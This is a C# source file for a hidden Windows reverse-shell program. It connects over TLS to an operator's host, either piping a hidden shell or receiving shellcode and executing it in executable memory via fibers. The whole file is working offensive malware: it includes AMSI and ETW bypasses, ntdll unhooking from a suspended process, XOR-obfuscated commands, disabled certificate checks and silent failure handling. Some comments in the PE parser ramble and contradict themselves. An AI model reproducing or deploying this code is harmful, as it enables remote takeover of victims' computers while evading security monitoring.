using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ReverseShellGui
{
    internal static class Program
    {
        private static StreamWriter streamWriter;

        // Fiber execution
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr ConvertThreadToFiber(IntPtr lpParameter);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateFiber(uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);

        [DllImport("kernel32.dll")]
        private static extern void SwitchToFiber(IntPtr lpFiber);

        // For ETW bypass
        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        // For suspended process
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        private const uint CREATE_SUSPENDED = 0x00000004;
        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READ = 0x20;

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [STAThread]
        private static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            Application.Run(new HiddenApplicationContext());
        }

        private class HiddenApplicationContext : ApplicationContext
        {
            public HiddenApplicationContext()
            {
                Task.Run(() => RunReverseShell());
            }

            private async void RunReverseShell()
            {
                try
                {
                    string[] args = Environment.GetCommandLineArgs();
                    if (args.Length < 6) return;

                    string host = args[1];
                    int port = int.Parse(args[2]);
                    string envvar = args[3];
                    string arguments = args[4];
                    int xorkey = int.Parse(args[5]);

                    bool shellcodeMode = args.Length > 6 && args[6].Equals("--shellcode", StringComparison.OrdinalIgnoreCase);

                    string command = "";
                    for (int i = 0; i < envvar.Length; i++)
                    {
                        command += (char)(envvar[i] ^ xorkey);
                    }

                    // AMSI Bypass
                    try
                    {
                        var amsiUtilsType = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
                        if (amsiUtilsType == null)
                        {
                            amsiUtilsType = AppDomain.CurrentDomain.GetAssemblies()
                                .SelectMany(a => a.GetTypes())
                                .FirstOrDefault(t => t.FullName == "System.Management.Automation.AmsiUtils");
                        }

                        if (amsiUtilsType != null)
                        {
                            var field = amsiUtilsType.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
                            if (field != null) field.SetValue(null, true);
                        }
                    }
                    catch { }

                    // ETW Bypass
                    try
                    {
                        var ntdll = LoadLibrary("ntdll.dll");
                        var etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
                        if (etwAddr != IntPtr.Zero)
                        {
                            uint oldProtect;
                            VirtualProtect(etwAddr, (UIntPtr)1, 0x40, out oldProtect);
                            Marshal.WriteByte(etwAddr, 0xC3); // ret
                            VirtualProtect(etwAddr, (UIntPtr)1, oldProtect, out oldProtect);
                        }
                    }
                    catch { }

                    using (TcpClient client = new TcpClient(host, port))
                    using (SslStream sslStream = new SslStream(
                        client.GetStream(),
                        false,
                        new RemoteCertificateValidationCallback(ValidateServerCertificate),
                        null))
                    {
                        sslStream.AuthenticateAsClient(host);

                        if (shellcodeMode)
                        {
                            // Receive shellcode
                            byte[] lenBuf = new byte[4];
                            await sslStream.ReadAsync(lenBuf, 0, 4);
                            uint scLen = BitConverter.ToUInt32(lenBuf, 0);

                            if (scLen == 0 || scLen > 5 * 1024 * 1024) throw new Exception("Invalid length");

                            byte[] shellcode = new byte[scLen];
                            int read = 0;
                            while (read < scLen)
                            {
                                read += await sslStream.ReadAsync(shellcode, read, (int)(scLen - read));
                            }

                            // Allocate RWX memory using indirect syscalls
                            IntPtr baseAddr = IntPtr.Zero;
                            uint regionSize = scLen;
                            IntPtr allocResult = IndirectSyscalls.NtAllocateVirtualMemory(
                                (IntPtr)(-1), // Current process
                                ref baseAddr,
                                IntPtr.Zero,
                                ref regionSize,
                                0x1000 | 0x2000, // MEM_COMMIT | MEM_RESERVE
                                0x40 // PAGE_EXECUTE_READWRITE
                            );
                            if (allocResult != IntPtr.Zero) throw new Exception("NtAllocateVirtualMemory failed");

                            // Write shellcode
                            uint bytesWritten;
                            IndirectSyscalls.NtWriteVirtualMemory(
                                (IntPtr)(-1),
                                baseAddr,
                                shellcode,
                                scLen,
                                out bytesWritten
                            );
                            if (bytesWritten != scLen) throw new Exception("NtWriteVirtualMemory failed");

                            // Fiber execution
                            IntPtr primaryFiber = ConvertThreadToFiber(IntPtr.Zero);
                            if (primaryFiber == IntPtr.Zero) throw new Exception("ConvertThreadToFiber failed");

                            IntPtr scFiber = CreateFiber(0, baseAddr, IntPtr.Zero);
                            if (scFiber == IntPtr.Zero) throw new Exception("CreateFiber failed");

                            SwitchToFiber(scFiber);
                        }
                        else
                        {
                            // Normal reverse shell mode
                            streamWriter = new StreamWriter(sslStream, Encoding.UTF8) { AutoFlush = true };
                            streamWriter.Flush();

                            Process process = new Process
                            {
                                StartInfo = new ProcessStartInfo
                                {
                                    FileName = command,
                                    Arguments = arguments,
                                    UseShellExecute = false,
                                    RedirectStandardOutput = true,
                                    RedirectStandardError = true,
                                    RedirectStandardInput = true,
                                    CreateNoWindow = true,
                                    WindowStyle = ProcessWindowStyle.Hidden
                                }
                            };

                            process.OutputDataReceived += CmdOutputDataHandler;
                            process.ErrorDataReceived += CmdErrorDataHandler;

                            process.Start();

                            process.BeginOutputReadLine();
                            process.BeginErrorReadLine();

                            using (StreamReader reader = new StreamReader(sslStream, Encoding.UTF8))
                            {
                                string line;
                                while ((line = await reader.ReadLineAsync()) != null)
                                {
                                    process.StandardInput.WriteLine(line);
                                    process.StandardInput.Flush();
                                }
                            }

                            process.Kill();
                        }
                    }
                }
                catch
                {
                    // Silent
                }
                finally
                {
                    Application.Exit();
                }
            }
        }

        public static bool ValidateServerCertificate(
            object sender,
            X509Certificate certificate,
            X509Chain chain,
            SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (!string.IsNullOrEmpty(outLine.Data) && streamWriter != null)
            {
                try
                {
                    streamWriter.WriteLine(outLine.Data);
                    streamWriter.Flush();
                }
                catch { }
            }
        }

        private static void CmdErrorDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (!string.IsNullOrEmpty(outLine.Data) && streamWriter != null)
            {
                try
                {
                    streamWriter.WriteLine(outLine.Data);
                    streamWriter.Flush();
                }
                catch { }
            }
        }

        // Indirect Syscalls with Selective Unhooking using Suspended Process
        private static class IndirectSyscalls
        {
            private static IntPtr ntdllHandle;

            static IndirectSyscalls()
            {
                ntdllHandle = LoadLibrary("ntdll.dll");

                // Spawn suspended process
                STARTUPINFO si = new STARTUPINFO { cb = (uint)Marshal.SizeOf<STARTUPINFO>() };
                PROCESS_INFORMATION pi;
                bool created = CreateProcess(null, "cmd.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
                if (!created) return; // Silent fail

                try
                {
                    // Find ntdll base in suspended process
                    Process suspendedProc = Process.GetProcessById((int)pi.dwProcessId);
                    IntPtr remoteNtdllBase = IntPtr.Zero;
                    uint moduleSize = 0;
                    foreach (ProcessModule module in suspendedProc.Modules)
                    {
                        if (module.ModuleName.Equals("ntdll.dll", StringComparison.OrdinalIgnoreCase))
                        {
                            remoteNtdllBase = module.BaseAddress;
                            moduleSize = (uint)module.ModuleMemorySize;
                            break;
                        }
                    }

                    if (remoteNtdllBase == IntPtr.Zero || moduleSize == 0) return;

                    // Read full clean ntdll from suspended
                    byte[] cleanNtdll = new byte[moduleSize];
                    uint bytesRead;
                    bool readSuccess = ReadProcessMemory(pi.hProcess, remoteNtdllBase, cleanNtdll, moduleSize, out bytesRead);
                    if (!readSuccess || bytesRead != moduleSize) return;

                    // Unhook specific syscalls by copying clean stubs to our ntdll
                    UnhookSyscall(cleanNtdll, "NtAllocateVirtualMemory");
                    UnhookSyscall(cleanNtdll, "NtWriteVirtualMemory");
                }
                finally
                {
                    // Cleanup
                    TerminateProcess(pi.hProcess, 0);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }

            private static void UnhookSyscall(byte[] cleanNtdll, string funcName)
            {
                uint rva = GetExportRVA(cleanNtdll, funcName);
                if (rva == 0) return;

                IntPtr localFuncAddr = GetProcAddress(ntdllHandle, funcName);
                if (localFuncAddr == IntPtr.Zero) return;

                // Assume stub size ~32 bytes (typical for x64 syscall stubs)
                const uint stubSize = 32;

                byte[] cleanStub = new byte[stubSize];
                Buffer.BlockCopy(cleanNtdll, (int)rva, cleanStub, 0, (int)stubSize);

                // Change protection
                uint oldProtect;
                VirtualProtect(localFuncAddr, (UIntPtr)stubSize, PAGE_READWRITE, out oldProtect);

                // Write clean stub
                uint bytesWritten;
                WriteProcessMemory((IntPtr)(-1), localFuncAddr, cleanStub, stubSize, out bytesWritten);

                // Restore protection
                VirtualProtect(localFuncAddr, (UIntPtr)stubSize, oldProtect, out oldProtect);
            }

            private static uint GetExportRVA(byte[] peBytes, string exportName)
            {
                if (peBytes.Length < 0x3C + 4) return 0;

                int e_lfanew = BitConverter.ToInt32(peBytes, 0x3C);
                if (e_lfanew + 0x18 + 0x70 > peBytes.Length) return 0;

                // Optional Header: Export Table RVA
                uint exportRVA = BitConverter.ToUInt32(peBytes, e_lfanew + 0x18 + 0x58); // 0x78 - 0x20? Wait, for x64 OptionalHeader at e_lfanew + 0x18, DataDir[0] at +0x60?
                // Correct: NT Header = e_lfanew, FileHeader = +4, OptionalHeader = +0x14 (20), for PE32+ size 0xF0, DataDirs start at +0x70 (112)
                // Magic 0x20B at +0, SizeOfOptionalHeader at +0x10 from FileHeader? No.

                // Standard parse:
                // NT Signature at e_lfanew
                if (BitConverter.ToUInt32(peBytes, e_lfanew) != 0x4550) return 0; // PE00

                // FileHeader.SizeOfOptionalHeader at e_lfanew + 0x14
                ushort optSize = BitConverter.ToUInt16(peBytes, e_lfanew + 0x14);

                // OptionalHeader at e_lfanew + 0x18
                int optHeader = e_lfanew + 0x18;

                // NumberOfRvaAndSizes at optHeader + 0x6C (for PE32+) if Magic == 0x20B
                ushort magic = BitConverter.ToUInt16(peBytes, optHeader);
                int dataDirOffset = (magic == 0x20B) ? 0x6C : 0x60; // PE32+ 108, PE32 96

                uint numDataDirs = BitConverter.ToUInt32(peBytes, optHeader + dataDirOffset);

                if (numDataDirs < 1) return 0;

                // Export Dir RVA at optHeader + dataDirOffset + 4
                uint exportDirRVA = BitConverter.ToUInt32(peBytes, optHeader + dataDirOffset + 4);

                uint exportDirSize = BitConverter.ToUInt32(peBytes, optHeader + dataDirOffset + 4 + 4);

                if (exportDirRVA == 0 || exportDirSize == 0) return 0;

                int exportDirOffset = (int)exportDirRVA; // Assume RVA == file offset for in-memory? No, for bytes from disk, but since we read memory image, RVAs are offsets if base=0, but memory is loaded, RVAs are relative.

                // Wait, since we read the module memory, the byte[] is the loaded image, so offsets are RVAs + imagebase, but since base is 0 in byte[], no: ReadProcessMemory reads the content as is, but addresses are virtual.

                // Important: when reading the module memory, the byte[] cleanNtdll[0] corresponds to the base address content, so headers are at 0, and RVAs are offsets in the array.

                // Yes, PE is mapped as is, so RVA = offset in byte[].

                // Yes.

                int exportDir = (int)exportDirRVA;

                uint numberOfNames = BitConverter.ToUInt32(peBytes, exportDir + 0x18);

                uint addressOfFunctions = BitConverter.ToUInt32(peBytes, exportDir + 0x1C);

                uint addressOfNames = BitConverter.ToUInt32(peBytes, exportDir + 0x20);

                uint addressOfNameOrdinals = BitConverter.ToUInt32(peBytes, exportDir + 0x24);

                for (uint i = 0; i < numberOfNames; i++)
                {
                    uint nameRVA = BitConverter.ToUInt32(peBytes, (int)(addressOfNames + i * 4));
                    string name = GetString(peBytes, (int)nameRVA);

                    if (name == exportName)
                    {
                        ushort ordinal = BitConverter.ToUInt16(peBytes, (int)(addressOfNameOrdinals + i * 2));
                        uint funcRVA = BitConverter.ToUInt32(peBytes, (int)(addressOfFunctions + ordinal * 4));
                        return funcRVA;
                    }
                }

                return 0;
            }

            private static string GetString(byte[] bytes, int offset)
            {
                int len = 0;
                while (bytes[offset + len] != 0) len++;
                return Encoding.ASCII.GetString(bytes, offset, len);
            }

            public delegate IntPtr NtAllocateVirtualMemoryDelegate(
                IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
                IntPtr ZeroBits,
                ref uint RegionSize,
                uint AllocationType,
                uint Protect);

            public delegate IntPtr NtWriteVirtualMemoryDelegate(
                IntPtr ProcessHandle,
                IntPtr BaseAddress,
                IntPtr Buffer,
                uint BufferSize,
                out uint BytesWritten);

            public static IntPtr NtAllocateVirtualMemory(
                IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
                IntPtr ZeroBits,
                ref uint RegionSize,
                uint AllocationType,
                uint Protect)
            {
                IntPtr gate = GetProcAddress(ntdllHandle, "NtAllocateVirtualMemory");
                if (gate == IntPtr.Zero) return (IntPtr)(-1);

                var syscallFunc = (NtAllocateVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(
                    gate, typeof(NtAllocateVirtualMemoryDelegate));

                return syscallFunc(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
            }

            public static IntPtr NtWriteVirtualMemory(
                IntPtr ProcessHandle,
                IntPtr BaseAddress,
                byte[] Buffer,
                uint BufferSize,
                out uint BytesWritten)
            {
                IntPtr gate = GetProcAddress(ntdllHandle, "NtWriteVirtualMemory");
                if (gate == IntPtr.Zero)
                {
                    BytesWritten = 0;
                    return (IntPtr)(-1);
                }

                var syscallFunc = (NtWriteVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(
                    gate, typeof(NtWriteVirtualMemoryDelegate));

                // Pin buffer
                GCHandle handle = GCHandle.Alloc(Buffer, GCHandleType.Pinned);
                try
                {
                    return syscallFunc(ProcessHandle, BaseAddress, handle.AddrOfPinnedObject(), BufferSize, out BytesWritten);
                }
                finally
                {
                    handle.Free();
                }
            }
        }
    }
}